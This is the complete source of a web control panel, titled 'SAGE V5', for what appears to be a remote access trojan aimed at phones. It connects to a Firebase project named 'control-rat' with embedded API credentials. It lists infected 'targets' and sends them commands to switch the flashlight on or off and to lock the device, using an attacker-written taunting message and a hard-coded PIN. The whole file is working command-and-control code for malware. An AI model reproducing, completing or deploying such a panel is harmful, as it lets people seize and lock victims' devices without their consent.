<!DOCTYPE html>
<html>
<head>
    <title>SAGE V5 CONTROL</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        body { background: #000; color: #ff0000; font-family: monospace; padding: 20px; }
        .card { border: 1px solid #ff0000; padding: 15px; margin-bottom: 10px; background: #110000; }
        button { background: #ff0000; color: #fff; border: none; padding: 10px; margin: 5px; cursor: pointer; font-weight: bold; }
        .btn-flash { background: #ffcc00; color: #000; }
    </style>
</head>
<body>
    <h1>SAGE V5 | DASHBOARD</h1>
    <div id="targetList">Loading targets...</div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyBfeY-xJ4TQWrQq8IZwwsigP9jwPpstThk",
            authDomain: "control-rat.firebaseapp.com",
            databaseURL: "https://control-rat-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "control-rat",
            appId: "1:181283651682:web:42a169e6daaad00f7e513b"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        db.ref('targets').on('value', (snapshot) => {
            const list = document.getElementById('targetList');
            list.innerHTML = "";
            const data = snapshot.val();
            for(let id in data) {
                list.innerHTML += `
                <div class="card">
                    <h3>TARGET: ${id} [${data[id].status}]</h3>
                    <button class="btn-flash" onclick="send('${id}', 'flash', 'on')">FLASH ON</button>
                    <button class="btn-flash" onclick="send('${id}', 'flash', 'off')">FLASH OFF</button>
                    <button onclick="lock('${id}')">LOCK DEVICE</button>
                </div>`;
            }
        });

        function send(id, type, stat) {
            db.ref('commands/' + id).set({ type: type, status: stat });
        }

        function lock(id) {
            let m = prompt("Pesan Lock:", "TERKUNCI KAN HP LU WKWK");
            db.ref('commands/' + id).set({ type: "lock", message: m, pin: "7777" });
        }
    </script>
</body>
</html>
